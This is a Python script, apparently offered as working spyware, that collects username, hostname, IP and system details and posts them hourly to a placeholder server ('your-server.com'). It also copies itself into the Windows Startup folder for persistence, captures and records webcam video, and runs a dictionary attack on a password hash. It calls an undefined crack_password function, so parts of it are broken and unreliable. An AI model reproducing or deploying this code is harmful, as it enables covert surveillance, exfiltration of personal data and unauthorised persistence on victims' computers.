import os
import shutil
import subprocess
import requests
import time
import threading
import platform
import getpass
import socket
import psutil
import json
import base64
import hashlib
import cv2

SERVER_URL = 'http://your-server.com/submit'
USERNAME = getpass.getuser()
COMPUTER_NAME = socket.gethostname()

def gather_system_info():
    system_info = {}

    system_info['os'] = platform.system()
    system_info['os_version'] = platform.version()
    system_info['architecture'] = platform.architecture()

    system_info['hostname'] = socket.gethostname()
    system_info['ip_address'] = socket.gethostbyname(socket.gethostname())

    system_info['username'] = USERNAME

    system_info['cpu'] = platform.processor()

    mem = psutil.virtual_memory()
    system_info['total_memory'] = mem.total
    system_info['available_memory'] = mem.available

    return system_info

def exfiltrate_data(data):
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(SERVER_URL, data=json.dumps(data), headers=headers)
        if response.status_code == 200:
            print("[INFO] Data exfiltration successful")
        else:
            print("[ERROR] Data exfiltration failed")
    except Exception as e:
        print("[ERROR] Data exfiltration failed:", e)

def log_login_info():
    try:
        login_info = {}
        login_info['username'] = USERNAME
        login_info['computer_name'] = COMPUTER_NAME
        login_info['login_time'] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        exfiltrate_data(login_info)
    except Exception as e:
        print("[ERROR] Failed to log login info:", e)

def log_typing_activity(activity):
    try:
        typing_log = {}
        typing_log['username'] = USERNAME
        typing_log['activity'] = activity
        typing_log['time'] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        exfiltrate_data(typing_log)
    except Exception as e:
        print("[ERROR] Failed to log typing activity:", e)

def log_keyword(keyword):
    try:
        keyword_log = {}
        keyword_log['username'] = USERNAME
        keyword_log['keyword'] = keyword
        keyword_log['time'] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        exfiltrate_data(keyword_log)
    except Exception as e:
        print("[ERROR] Failed to log keyword:", e)

def log_location():
    try:
        location_info = {}
        location_info['username'] = USERNAME
        location_info['computer_name'] = COMPUTER_NAME
        location_info['ip_address'] = socket.gethostbyname(socket.gethostname())
        location_info['time'] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        exfiltrate_data(location_info)
    except Exception as e:
        print("[ERROR] Failed to log location:", e)

def install_persistence():
    try:
        home_dir = os.path.expanduser('~')
        startup_path = os.path.join(home_dir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
        shutil.copy(__file__, startup_path)
        print("[INFO] Persistence installed successfully")
    except Exception as e:
        print("[ERROR] Failed to install persistence:", e)

def start_password_cracking():
    try:
        hashed_password = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"  # Example 
        password_list = ["password", "123456", "qwerty", "letmein"]  # Example 

        result = crack_password(hashed_password, password_list)
        if result:
            print("Password cracked! The password is:", result)
        else:
            print("Password not found in the list.")
    except Exception as e:
        print("[ERROR] Failed to start password cracking:", e)


def start_webcam_access():
    try:
        cap = cv2.VideoCapture(0)

        while True:
            ret, frame = cap.read()
            cv2.imshow('Webcam', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        cap.release()
        cv2.destroyAllWindows()

        print("[INFO] Webcam access stopped")

    except Exception as e:
        print("[ERROR] Failed to start webcam access:", e)

def start_video_recording():
    try:
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))

        while cap.isOpened():
            ret, frame = cap.read()
            if ret:
                out.write(frame)
                cv2.imshow('Video', frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            else:
                break

        cap.release()
        out.release()
        cv2.destroyAllWindows()

        print("[INFO] Video recording stopped")

    except Exception as e:
        print("[ERROR] Failed to start video recording:", e)

def main():
    try:
        while True:
            system_info = gather_system_info()
            exfiltrate_data(system_info)
            time.sleep(3600)
    except KeyboardInterrupt:
        print("[INFO] Exiting spyware")

if __name__ == '__main__':
    install_persistence()
    start_password_cracking()
    start_webcam_access()
    start_video_recording()
    t = threading.Thread(target=main)
    t.daemon = True
    t.start()
    print("[INFO] Spyware running in the background Successfully")

                
